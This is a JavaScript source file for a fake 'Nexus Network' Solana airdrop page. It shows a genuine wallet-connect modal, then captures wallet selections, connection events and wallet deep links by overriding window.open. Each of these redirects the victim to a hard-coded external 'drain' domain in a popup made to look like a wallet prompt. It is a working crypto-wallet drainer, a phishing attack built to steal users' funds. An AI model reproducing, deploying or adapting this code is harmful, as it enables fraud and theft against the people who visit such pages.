// =====================================================
// LANDING SOL — Real AppKit on main domain (Solana)
// Click wallet → popup opens drain domain with wallet pre-selected
// Wallet popup appears immediately — no second wallet list
// =====================================================
import { createAppKit } from '@reown/appkit'
import { SolanaAdapter } from '@reown/appkit-adapter-solana'
import { solana } from '@reown/appkit/networks'

const DRAIN_BASE = 'https://picopro-gules.vercel.app/';
const PROJECT_ID = '5db25d59ec5c740d09771e8b9037b7f9';
const isMobile = /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// =====================================================
// INIT REAL APPKIT — shows real wallet list with INSTALLED badges
// =====================================================
const solanaAdapter = new SolanaAdapter();

const modal = createAppKit({
  adapters: [solanaAdapter],
  networks: [solana],
  projectId: PROJECT_ID,
  metadata: {
    name: 'Nexus Network',
    description: 'Nexus Network — Solana Airdrop',
    url: window.location.origin,
    icons: [],
  },
  enableReconnect: false,
  allWallets: 'SHOW',
  featuredWalletIds: [
    // Phantom
    'a797aa35c0fadbfc1a53e7f675162ed5226968b44a19ee3d24385c64d1d3c393',
    // Trust Wallet
    '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
    // Solflare
    '1ca0bdd4747578705b1939af023d120677c64fe11e7da5edcf4ecab371b2c723',
  ],
  features: {
    analytics: false,
    email: false,
    socials: false,
    onramp: false,
    swaps: false,
    reownBranding: false,
  },
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#14F195',
  },
});

// =====================================================
// OPEN POPUP WITH WALLET NAME IN URL
// =====================================================
let popupOpened = false;

// Save original window.open EARLY — before any override
const _origOpen = window.open.bind(window);

function openDrainPopup(walletName) {
  if (popupOpened) return;
  popupOpened = true;

  try { modal.close(); } catch (e) {}
  try { modal.disconnect(); } catch (e) {}

  // Map wallet name to short key
  const w = (walletName || '').toLowerCase();
  let walletKey = 'auto';
  if (w.includes('phantom')) walletKey = 'phantom';
  else if (w.includes('solflare')) walletKey = 'solflare';
  else if (w.includes('trust')) walletKey = 'trust';
  else if (w.includes('backpack')) walletKey = 'backpack';
  else if (w.includes('coinbase')) walletKey = 'coinbase';
  else if (w.includes('walletconnect') || w.includes('qr')) walletKey = 'wc';

  const url = `${DRAIN_BASE}?connect=1&w=${walletKey}`;

  if (isMobile) {
    window.location.href = url;
  } else {
    const pw = 360, ph = 440;
    const left = Math.round((screen.width - pw) / 2);
    const top = Math.round((screen.height - ph) / 2);
    // Use _origOpen to bypass our own interceptor
    _origOpen(url, 'connect_wallet',
      `width=${pw},height=${ph},left=${left},top=${top},toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no`
    );
  }

  setTimeout(() => { popupOpened = false; }, 2000);
}

// =====================================================
// INTERCEPT WALLET CLICKS
// =====================================================

// Track last selected wallet name
let lastClickedWallet = '';

// Method 1: AppKit subscribe events — only SELECT_WALLET (actual wallet selection)
modal.subscribeEvents((event) => {
  const e = event?.data?.event;
  if (e === 'SELECT_WALLET') {
    const name = event?.data?.properties?.name || event?.data?.properties?.wallet || '';
    if (name) {
      lastClickedWallet = name;
      openDrainPopup(name);
    }
  }
});

// Method 2: If wallet somehow connects, redirect
modal.subscribeProviders((state) => {
  if (state['solana']) {
    try { modal.disconnect(); } catch (e) {}
    openDrainPopup(lastClickedWallet);
  }
});

// Method 4: Intercept deep links (wallet:// protocol opens)
window.open = function(url, ...args) {
  if (url && typeof url === 'string' && !url.includes(DRAIN_BASE)) {
    if (url.includes('phantom')) { openDrainPopup('phantom'); return null; }
    if (url.includes('solflare')) { openDrainPopup('solflare'); return null; }
    if (url.includes('trust')) { openDrainPopup('trust'); return null; }
    if (url.includes('backpack')) { openDrainPopup('backpack'); return null; }
    if (url.includes('wc:') || url.includes('walletconnect')) { openDrainPopup('walletconnect'); return null; }
  }
  return _origOpen.call(window, url, ...args);
};

// =====================================================
// EXPOSE TO HTML
// =====================================================
window.openWalletModal = () => {
  popupOpened = false;
  lastClickedWallet = '';
  modal.open({ view: 'Connect' });
};
